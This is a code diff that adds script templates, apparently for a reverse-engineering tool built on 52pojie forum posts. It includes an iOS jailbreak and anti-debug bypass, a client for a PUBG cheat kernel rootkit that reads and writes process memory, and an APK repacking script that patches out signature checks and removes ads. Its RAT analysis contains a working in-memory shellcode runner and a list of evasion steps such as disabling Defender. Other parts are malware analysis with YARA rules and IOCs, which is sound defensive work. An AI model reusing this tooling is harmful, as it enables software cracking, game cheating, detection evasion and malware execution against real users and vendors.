+                this.debugCheck = true;
+            }
+        },
+        onLeave(retval) {
+            if (this.debugCheck && retval.toInt32() === 0) {
+                // 清除 P_TRACED bit
+                const info = this.context.x1;
+                if (info) {
+                    const flags = info.add(32).readU32();
+                    info.add(32).writeU32(flags & ~0x800);  // 清 P_TRACED
+                }
+            }
+        }
+    });
+
+    // 3. Hook task_info — 防内存异常检测
+    const ObjC = require('frida-objc');  // 如有需要
+
+    // 4. 阻止动态库枚举检测 (dyld_image_count)
+    const dyld_get_image_name = Module.getExportByName(null, '_dyld_get_image_name');
+    // Substrate/Tweak 的 dylib 路径通常含 /Library/MobileSubstrate/
+    Interceptor.attach(dyld_get_image_name, {
+        onLeave(retval) {
+            const name = retval.readUtf8String();
+            if (name && name.includes('MobileSubstrate')) {
+                retval.writeUtf8String('/usr/lib/libobjc.A.dylib');  // 替换成正常路径
+            }
+        }
+    });
+
+    console.log('[+] iOS 环境检测绕过已启动');
+})();
+\`;
+
+// === 检测项目完整列表（逆向总结）===
+const DETECTION_ITEMS = {
+    jailbreak_files: [
+        '/Applications/Cydia.app',
+        '/usr/sbin/sshd', '/bin/bash', '/etc/apt',
+        '/Library/MobileSubstrate/MobileSubstrate.dylib',
+        '/private/var/lib/apt', '/usr/bin/cycript',
+    ],
+    suspicious_procs: ['ps', 'top', 'cycript', 'gdb', 'lldb'],
+    dyld_check: 'MobileSubstrate in dylib paths',
+    syscall_hooks: ['access', 'stat', 'readlink', 'opendir', 'sysctl'],
+    anti_debug: 'P_TRACED via sysctl(KERN_PROC)',
+};
+
+// 使用: frida -U -f com.target.app -l bypass_ios_env.js
+module.exports = { decryptString, FRIDA_BYPASS_IOS, DETECTION_ITEMS };
+`,
+
+      'pojie:kernel_mod': `# 🔬 内核模块分析 — ko提取/ioctl接口/ARM64页表遍历
+# 目标: {param || 'ditpro_main'}
+"""
+25_pubg_kernel_module_analysis.py
+PUBG 内核辅助逆向分析 — 内核模块加载/自删除/ioctl接口
+来源: https://www.52pojie.cn/thread-2115015-1-1.html
+仅供安全研究学习，了解内核rootkit/辅助工作原理
+"""
+
+import gzip, struct, os
+
+# ============================================================
+# 1. 提取 ditpro_main 中内嵌的 .ko 内核模块
+# ============================================================
+def extract_ko_from_elf(elf_path: str, output_dir: str = './ko_files'):
+    """从 ditpro_main ELF 中提取 hex 编码的 .ko 内核模块"""
+    os.makedirs(output_dir, exist_ok=True)
+    
+    with open(elf_path, 'rb') as f:
+        data = f.read()
+    
+    # 内核模块以 ELF magic 的 hex 编码嵌入：7f454c46020101...
+    pattern = b"7f454c46020101"
+    results = []
+    start = 0
+    
+    while True:
+        idx = data.find(pattern, start)
+        if idx < 0:
+            break
+        
+        # 读到非 hex 字符为止
+        end = idx
+        while end < len(data) and chr(data[end]) in "0123456789abcdef":
+            end += 1
+        
+        hex_str = data[idx:end].decode('ascii')
+        if len(hex_str) > 100:  # 过滤太短的
+            results.append((idx, hex_str))
+            ko_data = bytes.fromhex(hex_str)
+            out_path = os.path.join(output_dir, f'ko_{len(results):02d}_{idx:08x}.ko')
+            with open(out_path, 'wb') as f:
+                f.write(ko_data)
+            print(f'[+] 提取 ko #{len(results)}: {len(ko_data)} bytes → {out_path}')
+        
+        start = end + 1
+    
+    print(f'[*] 共提取 {len(results)} 个内核模块')
+    return results
+
+# ============================================================
+# 2. .ko 内核模块功能（从 IDA 逆向总结）
+# ============================================================
+
+# init_module 做的三件事：
+# 1. misc_register(&misc)         → 注册 /dev/niuto01 设备
+# 2. list_del_init(&__this_module) → 从内核模块链表删除自己（lsmod 看不见）
+# 3. kobject_del(&module_kobject)  → 从 /sys/module/ 删除（cat /proc/modules 看不见）
+
+# ioctl 命令码（/dev/niuto01）：
+IOCTL_CMDS = {
+    26209: 'ReadProcPhyMem(pid, vaddr, buf, size)',
+    26210: 'WriteProcPhyMem(pid, vaddr, buf, size)',
+    26211: 'GetModuleBase(pid, name) → base_addr',
+    26212: 'Handshake() → 10086',  # magic number 校验
+}
+
+# 请求结构体（size=0x20）：
+# struct ioctl_req {
+#     uint64_t pid;      // 目标进程PID
+#     uint64_t addr;     // 虚拟地址（读写）或 name_ptr（获取模块）
+#     uint64_t buf;      // 用户态缓冲区指针
+#     uint64_t size;     // 大小
+# };
+
+# ============================================================
+# 3. ARM64 四级页表虚拟地址转物理地址（内核态实现）
+# ============================================================
+C_PAGE_TABLE_WALK = """
+// AArch64 四级页表：PGD → PUD → PMD → PTE
+__int64 translate_linear_address(__int64 mm, unsigned __int64 vaddr) {
+    // Level 1: PGD（39位VA用3级，48位VA用4级）
+    uint64_t pgd = *(mm->pgd + ((vaddr >> 30) & 0x1FF) * 8);
+    if (!pgd) return 0;
+
+    // Level 2: PMD
+    uint64_t pmd = *(phys_to_virt(pgd & 0xFFFFFFFFF000) + ((vaddr >> 21) & 0x1FF) * 8);
+    if (!pmd) return 0;
+
+    // 2MB 大页检测 (block descriptor: bit[0]=1, bit[1]=0)
+    if (!(pmd & 2)) {
+        if (pmd & 1)
+            return (pmd & 0xFFFFFFFFF000) + (vaddr & 0x1FFFFF);
+        return 0;
+    }
+
+    // Level 3: PTE（4KB普通页）
+    uint64_t pte = *(phys_to_virt(pmd & 0xFFFFFFFFF000) + ((vaddr >> 12) & 0x1FF) * 8);
+    if (!(pte & 1)) return 0;
+    return (pte & 0xFFFFFFFFF000) | (vaddr & 0xFFF);
+}
+
+// 按页读取跨页内存
+bool ReadProcPhyMem(uint64_t pid, uint64_t vaddr, void* user_buf, size_t size) {
+    struct mm_struct* mm = get_proc_mm(pid);
+    size_t remaining = size;
+    char* dst = user_buf;
+
+    while (remaining > 0) {
+        size_t page_off = vaddr & 0xFFF;
+        size_t chunk = min(remaining, 4096 - page_off);
+
+        uint64_t phys = translate_linear_address(mm, vaddr);
+        if (!phys) { vaddr += chunk; dst += chunk; remaining -= chunk; continue; }
+
+        void* kva = phys_to_virt(phys);
+        copy_to_user(dst, kva, chunk);
+
+        vaddr += chunk;
+        dst += chunk;
+        remaining -= chunk;
+    }
+    return true;
+}
+"""
+
+# ============================================================
+# 4. 用户态调用接口（Python）
+# ============================================================
+class KernelModuleClient:
+    """通过 /dev/niuto01 调用内核模块接口"""
+    
+    def __init__(self, dev='/dev/niuto01'):
+        import ctypes
+        self.dev = dev
+        self._fd = None
+    
+    def open(self):
+        self._fd = os.open(self.dev, os.O_RDWR)
+        return self
+    
+    def close(self):
+        if self._fd: os.close(self._fd)
+    
+    def _ioctl(self, cmd: int, req: bytes) -> bytes:
+        import array, fcntl
+        buf = array.array('B', req + b'\\x00' * (0x20 - len(req)))
+        fcntl.ioctl(self._fd, cmd, buf)
+        return bytes(buf)
+    
+    def handshake(self) -> bool:
+        """握手校验，返回 10086 表示成功"""
+        import struct
+        req = struct.pack('<QQQQ', 0, 0, 0, 0)
+        res = self._ioctl(26212, req)
+        result = struct.unpack('<QQQQ', res)[3]
+        return result == 10086
+    
+    def get_module_base(self, pid: int, module_name: str) -> int:
+        """获取目标进程的模块基址"""
+        import struct, ctypes
+        name_buf = ctypes.create_string_buffer(module_name.encode(), 256)
+        name_ptr = ctypes.addressof(name_buf)
+        req = struct.pack('<QQQ', pid, name_ptr, 0) + b'\\x00' * 8
+        res = self._ioctl(26211, req)
+        return struct.unpack('<QQQQ', res)[3]
+    
+    def read_memory(self, pid: int, addr: int, size: int) -> bytes:
+        """读取目标进程内存"""
+        import struct, ctypes
+        buf = ctypes.create_string_buffer(size)
+        buf_ptr = ctypes.addressof(buf)
+        req = struct.pack('<QQQQ', pid, addr, buf_ptr, size)
+        self._ioctl(26209, req)
+        return bytes(buf)
+
+
+# ============================================================
+# 5. 加载流程还原（ditpro_main 做的事）
+# ============================================================
+LOAD_FLOW = """
+ditpro_main 启动流程：
+
+1. 解包自身（shell 脚本 + gzip ELF）
+   skip=48; tail +$skip "$0" | gzip -cd > /tmp/xxx/ditpro_main
+
+2. 读取内核版本 (uname -r) 选择对应 .ko
+   支持: 4.14/4.19/5.4/5.10/5.15/6.1/6.6 共17个版本
+
+3. hex_decode_to_file(): 将内嵌 hex 数据写入随机路径
+
+4. insmod_and_delete(): 加载后立刻 unlink 文件（反取证）
+
+5. .ko init_module():
+   a. misc_register → 注册 /dev/niuto01
+   b. list_del_init → 从 lsmod 链表中隐身
+   c. kobject_del   → 从 /sys/module/ 中隐身
+
+6. 用户态通过 ioctl 调用内核能力：
+   - 读/写任意进程内存（绕过 ptrace 限制）
+   - 获取模块基址
+"""
+
+if __name__ == '__main__':
+    print(LOAD_FLOW)
+    print('IOCTL 命令码:', IOCTL_CMDS)
+    # 提取 ko: extract_ko_from_elf('/path/to/ditpro_main')
+`,
+
+      'pojie:apk_repack': `#!/bin/bash
+# 📦 APK全流程重打包 — 改包名/绕过Native校验/去广告
+# 目标APK: {param || 'target.apk'}
+#!/bin/bash
+# 26_apk_repack_bypass.sh
+# AI 辅助 APK 全流程重打包 — 改包名、绕过 Native 校验、去广告
+# 来源: https://www.52pojie.cn/thread-2100927-1-1.html
+# 工具链: apktool + zipalign + apksigner + adb
+
+# ============================================================
+# 阶段1: 解包 + 改包名
+# ============================================================
+APK="target.apk"
+PKG_OLD="com.original.package"
+PKG_NEW="com.your.package"
+WORK_DIR="apk_work"
+
+echo "[1] 解包"
+apktool d "$APK" -o "$WORK_DIR" --no-res  # --no-res 不解码资源，加快速度
+
+echo "[2] 改包名（可选，不改则跳过）"
+find "$WORK_DIR" -name "*.smali" -exec sed -i "s|$PKG_OLD|$PKG_NEW|g" {} +
+sed -i "s|$PKG_OLD|$PKG_NEW|g" "$WORK_DIR/AndroidManifest.xml"
+
+# ============================================================
+# 阶段2: 绕过 Native 签名/包名校验
+# ============================================================
+# 定位方法: jadx 打开 APK → 搜索 CheckApkSign/CheckPackageName
+# 或在 IDA 中搜索字符串 "check pass" "signatures" "getPackageName"
+
+SO_PATH="$WORK_DIR/lib/arm64-v8a/libappJni.so"
+SO_BAK="$SO_PATH.bak"
+
+cp "$SO_PATH" "$SO_BAK"
+
+# ARM64 机器码: mov w0, #1; ret
+# 字节: 20 00 80 52  C0 03 5F D6
+MOV_W0_1_RET="2000805 2c0035fd6"
+
+patch_so_function() {
+    local SO="$1"
+    local OFFSET="$2"
+    local DESC="$3"
+    echo "[patch] $DESC at offset $OFFSET"
+    printf '\\x20\\x00\\x80\\x52\\xc0\\x03\\x5f\\xd6' | dd of="$SO" bs=1 seek=$((16#$OFFSET)) conv=notrunc 2>/dev/null
+}
+
+# 示例偏移（需用 IDA 确认实际版本的偏移）
+# CheckPackageName 入口
+patch_so_function "$SO_PATH" "2234" "CheckPackageName → return 1"
+# CheckApkSign 入口
+patch_so_function "$SO_PATH" "248c" "CheckApkSign → return 1"
+
+echo "[verify] 反汇编验证补丁"
+aarch64-linux-gnu-objdump -d "$SO_PATH" 2>/dev/null | grep -A3 "0x2234:\\|0x248c:" || \\
+    python3 -c "
+import struct
+data = open('$SO_PATH','rb').read()
+for off in [0x2234, 0x248c]:
+    b = data[off:off+8]
+    print(f'  0x{off:x}: {b.hex()}', '✅' if b[:4]==bytes.fromhex('20008052') else '❌')
+"
+
+# ============================================================
+# 阶段3: Smali 层绕过（可选）
+# ============================================================
+# 找启动时调用 jniCall("1","1") 的位置（通常在 JniLoadTask.smali）
+# 将 invoke-virtual {v0, v1, v2}, L... -> nop
+
+JNILOAD_SMALI=$(grep -rl 'jniCall' "$WORK_DIR/smali" 2>/dev/null | head -1)
+if [ -n "$JNILOAD_SMALI" ]; then
+    echo "[3] 处理 Smali 层 jniCall 调用: $JNILOAD_SMALI"
+    # 备份
+    cp "$JNILOAD_SMALI" "$JNILOAD_SMALI.bak"
+    # 将 jniCall("1","1") 调用改为 nop（需要手动确认行号）
+    # sed -i 's/invoke-virtual.*jniCall.*/nop/' "$JNILOAD_SMALI"
+fi
+
+# ============================================================
+# 阶段4: 广告去除（可选）
+# ============================================================
+# 通用激励广告绕过: 找到 showVideo/showVideoAd 方法
+# 直接让它调用 afterVideo/rewardCallback，跳过展示广告
+
+ADSMANAGER=$(grep -rl 'showVideo\\|loadAds' "$WORK_DIR/smali" 2>/dev/null | grep -i 'ads\\|admanager' | head -1)
+if [ -n "$ADSMANAGER" ]; then
+    echo "[4] 广告管理器: $ADSMANAGER"
+    echo "    → 找 showVideo 方法，将中间广告调用替换为直接回调 afterVideo"
+fi
+
+# ============================================================
+# 阶段5: 重打包 + 签名
+# ============================================================
+OUT_APK="output_repacked.apk"
+OUT_ALIGNED="output_aligned.apk"
+OUT_SIGNED="output_signed.apk"
+
+echo "[5] 重打包"
+apktool b "$WORK_DIR" -o "$OUT_APK"
+
+echo "[6] zipalign 对齐（4字节，Android R+ 要求）"
+zipalign -f -p 4 "$OUT_APK" "$OUT_ALIGNED"
+zipalign -c 4 "$OUT_ALIGNED" && echo "  align ✅" || echo "  align ❌"
+
+echo "[7] 生成签名密钥（首次运行）"
+KEYSTORE="release.jks"
+if [ ! -f "$KEYSTORE" ]; then
+    keytool -genkey -v -keystore "$KEYSTORE" \\
+        -alias release \\
+        -keyalg RSA -keysize 2048 \\
+        -validity 10000 \\
+        -dname "CN=Publisher, OU=Dev, O=Studio, L=LA, ST=CA, C=US" \\
+        -storepass android \\
+        -keypass android
+fi
+
+echo "[8] apksigner 签名（v1+v2+v3）"
+apksigner sign \\
+    --ks "$KEYSTORE" \\
+    --ks-key-alias release \\
+    --ks-pass pass:android \\
+    --key-pass pass:android \\
+    --out "$OUT_SIGNED" \\
+    "$OUT_ALIGNED"
+
+echo "[9] 验证签名"
+apksigner verify --verbose "$OUT_SIGNED" 2>&1 | grep -E 'v[123]: |SUCCESS'
+
+echo "[10] 安装"
+adb install "$OUT_SIGNED"
+
+echo "完成: $OUT_SIGNED"
+
+# ============================================================
+# 常见问题
+# ============================================================
+: '
+问题: Failure [-124] resources.arsc 未对齐
+解决: zipalign 时加 -p 参数:  zipalign -f -p 4 in.apk out.apk
+
+问题: 启动卡住 (签名校验失败)
+解决: 1) patch so 中的 CheckApkSign 函数
+       2) 或 smali 中去掉 jniCall("1","1") 调用
+
+问题: 包名冲突
+解决: 完整替换 smali + manifest 中的旧包名
+
+问题: v2/v3 签名后仍安装失败
+解决: 检查是否有 META-INF/ 残留，apktool b 后清理再 zipalign
+'
+`,
+
+      'pojie:unidbg': `// ☕ unidbg多线程架构 — 时间片调度/TLS修复
+// 目标SO: {param || 'libsign.so'}
+// 27_unidbg_multithreading.java
+// unidbg 单后端多线程架构重构 — 调用级并发实现
+// 来源: https://www.52pojie.cn/thread-2117230-1-1.html
+// 
+// 核心思路：时间片轮转 → 调用级并发
+// Safe-Point: syscall入口/callback返回处，用 emu_stop 让出CPU
+// 主线程给一个大时间片(50000条指令)，worker线程给小时间片(12000条)
+
+// ============================================================
+// 1. 后端停止原因枚举（新增 TIMESLICE）
+// ============================================================
+/*
+public enum BackendStopReason {
+    NONE(0),
+    NORMAL(1),    // 正常执行到 until 地址
+    TIMESLICE(2), // 指令预算耗尽（核心新增）
+    EMU_STOP(3),  // 显式调用 emu_stop()
+    FAULT(4);     // uc_emu_start 返回错误
+}
+*/
+
+// ============================================================
+// 2. Unicorn C 层：时间片中断回调（JNI Native）
+// ============================================================
+/*
+// unicorn.c
+static void native_timeslice_cb(struct uc_struct *uc,
+                                uint64_t address,
+                                uint32_t size,
+                                void *user_data) {
+    t_unicorn unicorn = (t_unicorn) user_data;
+    if (!unicorn->timeslice_enabled) return;
+    if (unicorn->timeslice_budget == 0) return;
+
+    if (++unicorn->timeslice_counter >= unicorn->timeslice_budget) {
+        unicorn->timeslice_counter = 0;
+        unicorn->last_stop_pc = address;
+        unicorn->last_stop_reason = STOP_TIMESLICE;
+        uc_emu_stop(uc);   // 强制停止模拟
+    }
+}
+
+// emu_start 包装
+JNIEXPORT void JNICALL
+Java_com_github_unidbg_arm_backend_unicorn_Unicorn_emu_1start(...) {
+    t_unicorn unicorn = (t_unicorn) handle;
+    unicorn->timeslice_counter = 0;
+    unicorn->last_stop_reason = STOP_NONE;
+    
+    uc_err err = uc_emu_start(eng, begin, until, timeout, count);
+    
+    if (err != UC_ERR_OK)
+        unicorn->last_stop_reason = STOP_FAULT;
+    else if (unicorn->last_stop_reason == STOP_TIMESLICE)
+        return;  // 时间片耗尽，等待下次调度
+    else
+        unicorn->last_stop_reason = STOP_NORMAL;
+}
+*/
+
+// ============================================================
+// 3. Java 层：时间片感知的 emu_start
+// ============================================================
+/*
+// 在 ThreadContextSwitchPatch 或 SvcMemory 调用 emu_start 的地方
+boolean timesliceEnabled = enableNativeTimeslice();
+BackendStopReason reason = BackendStopReason.NONE;
+
+try {
+    backend.emu_start(begin, until, 0, 0);
+} finally {
+    if (timesliceEnabled) {
+        reason = backend.getLastStopReason();
+        set(TIMESLICE_REASON_KEY, reason);
+        set(TIMESLICE_STOP_PC_KEY, backend.getLastStopPc());
+        disableNativeTimeslice();
+    }
+}
+
+if (timesliceEnabled && reason == BackendStopReason.TIMESLICE) {
+    set(EMU_TIMESLICE_KEY, Boolean.TRUE);
+    // 抛出上下文切换异常，调度器捕获后切换到下一个线程
+    throw new ThreadContextSwitchException()
+            .setReason(ThreadContextSwitchException.Reason.TIMESLICE);
+}
+*/
+
+// ============================================================
+// 4. 时间片预算策略
+// ============================================================
+/*
+private long getTimesliceBudget() {
+    RunnableTask runningTask = threadDispatcher.getRunningTask();
+    boolean isWorker = runningTask instanceof Task
+            && !((Task) runningTask).isMainThread();
+    // worker 给小预算，让主线程快速推进
+    return isWorker ? 12000L : 50000L;
+}
+*/
+
+// ============================================================
+// 5. 线程状态机
+// ============================================================
+/*
+enum TaskState {
+    NEW,       // 刚创建，未被调度过
+    RUNNABLE,  // 可以被调度器选中
+    RUNNING,   // 正在 emu_start 执行中
+    WAITING,   // 因 futex wait 阻塞
+    FINISHED,  // 线程退出
+}
+*/
+
+// ============================================================
+// 6. TLS/TPIDR 污染修复
+// ============================================================
+/*
+// UniThreadDispatcher 任务切换时检查 TPIDR_EL0 是否被污染
+private void restoreMainTpidrIfPolluted() {
+    long currentTpidr = backend.reg_read(UC_ARM64_REG_TPIDR_EL0);
+    long mainBase   = getMainTlsBase();
+    long workerBase = getWorkerTlsBase();
+
+    // 主线程 TPIDR 指向 worker TLS 区域 → 被污染
+    if (currentTpidr >= workerBase && currentTpidr < workerBase + TLS_SIZE) {
+        // 从快照恢复
+        backend.reg_write(UC_ARM64_REG_TPIDR_EL0, mainTpidrSnapshot);
+    }
+}
+*/
+
+// ============================================================
+// 7. 使用方式（以签名逆向为例）
+// ============================================================
+/*
+import com.github.unidbg.AndroidEmulator;
+import com.github.unidbg.linux.android.AndroidEmulatorBuilder;
+import com.github.unidbg.linux.android.dvm.AbstractJni;
+import com.github.unidbg.linux.android.dvm.DalvikModule;
+
+public class SignatureHook extends AbstractJni {
+    
+    public static void main(String[] args) throws Exception {
+        AndroidEmulator emulator = AndroidEmulatorBuilder
+            .for64Bit()
+            .setProcessName("com.target.app")
+            .addBackendFactory(new DynarmicFactory(true))  // 多线程用 Dynarmic
+            .build();
+        
+        // 加载 so
+        DalvikModule dm = emulator.loadLibrary("libsign.so", true);
+        
+        // 调用签名函数
+        Number result = emulator.callFunction(signFuncAddr, param1, param2);
+        System.out.println("sign = " + Long.toHexString(result.longValue()));
+    }
+    
+    @Override
+    public DvmObject<?> callStaticObjectMethod(BaseVM vm, DvmClass dvmClass,
+            String signature, VarArg varArg) {
+        // Hook Java 方法回调
+        if ("android/content/Context->getPackageName()Ljava/lang/String;".equals(signature)) {
+            return new StringObject(vm, "com.target.app");
+        }
+        return super.callStaticObjectMethod(vm, dvmClass, signature, varArg);
+    }
+}
+*/
+`,
+
+      'pojie:rat_analysis': `# 🦠 Python远控木马全链路分析 — 10层嵌套投递器
+# 样本: {param || 'uzusy28.exe'}
+"""
+28_python_rat_analysis.py
+Python 远控木马全流程分析 — 多层嵌套投递器逆向
+来源: https://www.52pojie.cn/thread-2103528-1-1.html
+
+投递链（10层）:
+uzusy28.exe(PyInstaller) → oo.pyc → dd.pyc(7z密码2026) → wefault.exe
+→ pythonw.exe → encodings/__init__.pyc(被篡改) → Donut Shellcode #1
+→ fsch.dll → base32.pyc → Donut Shellcode #2 → RAT DLL
+
+RAT功能: 屏幕截图/键盘记录/剪贴板监控/文件管理/进程注入(守护进程)
+C2: DNS-over-HTTPS解析 → TCP/KCP连接
+"""
+
+import struct, io, ctypes
+from ctypes import wintypes
+
+# ============================================================
+# 1. 内存解压 7z 并释放（oo.pyc 核心逻辑还原）
+# ============================================================
+def decompress_embedded_7z(data: bytes, password: str = '2026', output_dir: str = 'C:/programdata/python'):
+    """从内存解压嵌入的 7z 文件"""
+    try:
+        import py7zr
+    except ImportError:
+        print("pip install py7zr")
+        return
+    
+    import os
+    os.makedirs(output_dir, exist_ok=True)
+    
+    with py7zr.SevenZipFile(io.BytesIO(data), mode='r', password=password) as archive:
+        archive.extractall(path=output_dir)
+    print(f"[+] 解压到 {output_dir}")
+
+
+# ============================================================
+# 2. Shellcode 通过 CreateFileMapping 无文件执行（内存执行）
+# ============================================================
+def execute_shellcode_in_memory(shellcode: bytes) -> None:
+    """
+    利用 CreateFileMapping + MapViewOfFile 申请 RWX 匿名内存段执行 shellcode
+    比 VirtualAlloc 更隐蔽，某些安全软件不监控 MapViewOfFile
+    """
+    kernel32 = ctypes.windll.kernel32
+    INVALID_HANDLE_VALUE = -1
+    PAGE_EXECUTE_READWRITE = 0x40
+    FILE_MAP_WRITE = 0x2
+    FILE_MAP_EXECUTE = 0x20
+
+    hMap = kernel32.CreateFileMappingW(
+        INVALID_HANDLE_VALUE, None, PAGE_EXECUTE_READWRITE,
+        0, len(shellcode), None
+    )
+    pMem = kernel32.MapViewOfFile(
+        hMap, FILE_MAP_WRITE | FILE_MAP_EXECUTE,
+        0, 0, len(shellcode)
+    )
+    ctypes.memmove(pMem, shellcode, len(shellcode))
+    
+    # 执行
+    func = ctypes.cast(pMem, ctypes.CFUNCTYPE(None))
+    func()
+
+
+# ============================================================
+# 3. 持久化与提权检测特征
+# ============================================================
+PERSISTENCE = {
+    'registry': 'HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders\\\\Startup',
+    'startup_dir': r'C:\\ProgramData\\Tencent\\Tencent',
+    'shortcut': r'C:\\Users\\Public\\Desktop\\bai_du_wangpan.exe.lnk',
+    'task_name': r'\\Microsoft\\MicrosoftUpdate',
+}
+
+EVASION = [
+    '禁用 UAC: 3个注册表值',
+    '关闭 Windows Defender + 添加排除路径 C:\\\\',
+    '检测火绒 HipsDaemon.exe 并规避',
+    '调用 ProcessBreakOnTermination 防强杀',
+    '进程注入 svchost.exe + 60秒守护重启',
+    '使用 DNS-over-HTTPS 隐藏 C2 解析',
+]
+
+# ============================================================
+# 4. 键盘记录核心（剪贴板+按键双轨）
+# ============================================================
+KEYLOGGER_LOGIC = """
+while (true):
+    Sleep(1ms)
+    
+    # 剪贴板监控（每1.5秒）
+    if GetTickCount() - last_check > 1500:
+        data = GetClipboardData(CF_UNICODETEXT)
+        if data 变化: 发送到 C2
+    
+    # 键盘状态（DirectInput8）
+    DirectInput.GetDeviceData(24 bytes per event)
+    # 解析102个虚拟键码
+    # scancode → 字符（含Shift/CapsLock状态）
+    if 缓冲区非空: 发送到 C2 并清空
+"""
+
+# ============================================================
+# 5. 进程注入守护（svchost.exe 白加黑）
+# ============================================================
+PROCESS_INJECTION = """
+1. GetSystemDirectoryA → 取系统盘符 (e.g. "C:\\\\")
+2. 构造: "<盘符>Windows\\\\System32\\\\svchost.exe"
+3. CreateProcessA(CREATE_SUSPENDED | CREATE_NO_WINDOW)
+4. 在 svchost 中 VirtualAllocEx(0x130, RWX) 写入:
+   - 函数指针表: WinExec/OpenProcess/ExitProcess/WaitForSingleObject
+   - 当前进程PID
+   - 恶意程序完整路径
+5. VirtualAllocEx(0x1000, RWX) 写入守护 shellcode
+6. CreateRemoteThread(CREATE_SUSPENDED)
+7. Sleep(60秒) → ResumeThread
+8. 守护shellcode: WaitForSingleObject(父进程) → WinExec(重启恶意程序)
+"""
+
+# ============================================================
+# 6. IOC（入侵指标）
+# ============================================================
+IOC = {
+    'c2_ip': ['202.79.169.198'],
+    'c2_port': [8853],
+    'protocol': 'TCP/KCP',
+    'files': [
+        'uzusy28.exe', 'oo.pyc', 'dd.pyc', 'wefault.exe',
+        'fhkan.oi', 'fsch.dll', 'base32.pyc',
+        r'C:\\ProgramData\\Tencent\\Tencent\\',
+        r'C:\\Users\\Public\\Desktop\\bai_du_wangpan.exe.lnk',
+    ],
+    'registry': [
+        r'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Startup',
+    ],
+    'task': r'\\Microsoft\\MicrosoftUpdate',
+    'mutex': 'Gact2.0Omaha',
+}
+
+# ============================================================
+# 7. 提取嵌入 PE（从 shellcode blob 中扒出 DLL）
+# ============================================================
+def extract_pe_from_blob(blob_path: str, output_path: str) -> bool:
+    """从二进制 blob 中找到并提取最大的有效 PE 文件"""
+    with open(blob_path, 'rb') as f:
+        data = f.read()
+    
+    best_offset = -1
+    best_size = 0
+    
+    i = 0
+    while i < len(data) - 2:
+        if data[i] == 0x4D and data[i+1] == 0x5A:  # MZ magic
+            if i + 0x42 < len(data):
+                pe_offset = struct.unpack_from('<I', data, i + 0x3C)[0]
+                if i + pe_offset + 6 < len(data):
+                    if data[i+pe_offset] == 0x50 and data[i+pe_offset+1] == 0x45:  # PE magic
+                        size = len(data) - i
+                        if size > best_size:
+                            best_size = size
+                            best_offset = i
+        i += 1
+    
+    if best_offset < 0:
+        print("[-] 未找到有效 PE")
+        return False
+    
+    pe_data = data[best_offset:]
+    with open(output_path, 'wb') as f:
+        f.write(pe_data)
+    print(f"[+] 提取 PE: {best_size} bytes → {output_path}")
+    return True
+
+# ============================================================
+# 8. XOR 0x36 解密（fhkan.oi 载荷解密）
+# ============================================================
+def decrypt_xor36(input_path: str, output_path: str):
+    """解密 XOR 0x36 加密的二进制载荷"""
+    with open(input_path, 'rb') as f:
+        data = bytearray(f.read())
+    for i in range(len(data)):
+        data[i] ^= 0x36
+    with open(output_path, 'wb') as f:
+        f.write(data)
+    print(f"[+] 解密完成: {output_path}")
+    # 继续提取 PE
+    extract_pe_from_blob(output_path, output_path.replace('.bin', '_pe.dll'))
+
+
+if __name__ == '__main__':
+    print("=== Python 远控木马分析工具 ===")
+    print("IOC:", IOC)
+    print("\\n持久化特征:", PERSISTENCE)
+    print("\\n规避技术:", '\\n  '.join(EVASION))
+`,
+
+      'pojie:silverfox': `# 🦊 银狐木马分析 — XOR解密/PE提取/YARA/IOC
+# 样本: {param || 'ev2c34.exe'}
+"""
+29_silverfox_analysis.py
+银狐木马分析工具 — XOR解密/PE提取/YARA规则/IOC
+来源: https://www.52pojie.cn/thread-2117521-1-1.html
+银狐特征: 伪装百度网盘/Omaha更新，白加黑DLL旁载，XOR0x36加密载荷
+"""
+
+import struct, re
+
+# ============================================================
+# 1. 解密嵌入的文件名（静态常量XOR解密）
+# ============================================================
+def decrypt_embedded_name():
+    """还原 ev2c34.exe 中加密的目标文件名 fhkan.oi"""
+    v21 = bytearray(struct.pack('<II', 842807599, 976811831))
+    for i in range(8):
+        v21[i] = (0x14 ^ ((v21[i] - 0xBD) & 0xFF)) & 0xFF
+    return v21.decode('latin1')  # => fhkan.oi
+
+# ============================================================
+# 2. 解密 XOR-0x36 载荷文件
+# ============================================================
+def decrypt_xor36(input_path: str, output_path: str):
+    with open(input_path, 'rb') as f:
+        data = bytearray(f.read())
+    for i in range(len(data)):
+        data[i] ^= 0x36
+    with open(output_path, 'wb') as f:
+        f.write(data)
+    print(f"[+] XOR-0x36 解密: {output_path}")
+    return output_path
+
+# ============================================================
+# 3. 从 shellcode blob 提取最大 PE
+# ============================================================
+def extract_largest_pe(blob_path: str, output_path: str) -> bool:
+    with open(blob_path, 'rb') as f:
+        data = f.read()
+    
+    best_off, best_sz = -1, 0
+    for i in range(len(data) - 2):
+        if data[i:i+2] == b'MZ':
+            pe_off_raw = data[i+0x3C:i+0x40]
+            if len(pe_off_raw) < 4: continue
+            pe_off = struct.unpack_from('<I', pe_off_raw)[0]
+            sig_off = i + pe_off
+            if sig_off + 2 < len(data) and data[sig_off:sig_off+2] == b'PE':
+                sz = len(data) - i
+                if sz > best_sz:
+                    best_sz = sz; best_off = i
+    
+    if best_off < 0: print("[-] 未找到PE"); return False
+    with open(output_path, 'wb') as f:
+        f.write(data[best_off:])
+    print(f"[+] 提取PE: {best_sz}B → {output_path}")
+    return True
+
+# ============================================================
+# 4. 全流程一键处理
+# ============================================================
+def process_silverfox_payload(fhkan_path: str, output_dir: str = '.'):
+    """银狐载荷一键解密+提取"""
+    import os; os.makedirs(output_dir, exist_ok=True)
+    
+    # Step1: XOR解密
+    dec = os.path.join(output_dir, 'fhkan.dec.bin')
+    decrypt_xor36(fhkan_path, dec)
+    
+    # Step2: 提取 PE
+    pe_out = os.path.join(output_dir, 'Horse_in.dll')
+    extract_largest_pe(dec, pe_out)
+    
+    print(f"[*] 下一步: 用 IDA/PE-bear 分析 {pe_out}")
+
+# ============================================================
+# 5. YARA 检测规则
+# ============================================================
+YARA_RULES = """
+rule SilverFox_BaiduPan_Loader {
+  meta:
+    description = "SilverFox loader - BaiduNetdisk lure, Omaha impersonation"
+    family      = "SilverFox"
+  strings:
+    $s1   = "Gact2.0Omaha" ascii
+    $s2   = "Horse_in.dll" ascii nocase
+    $s3   = "upline.dll" ascii nocase
+    $s4   = "CreateUandE.dll" ascii nocase
+    $s5   = "Protect.dll" ascii nocase
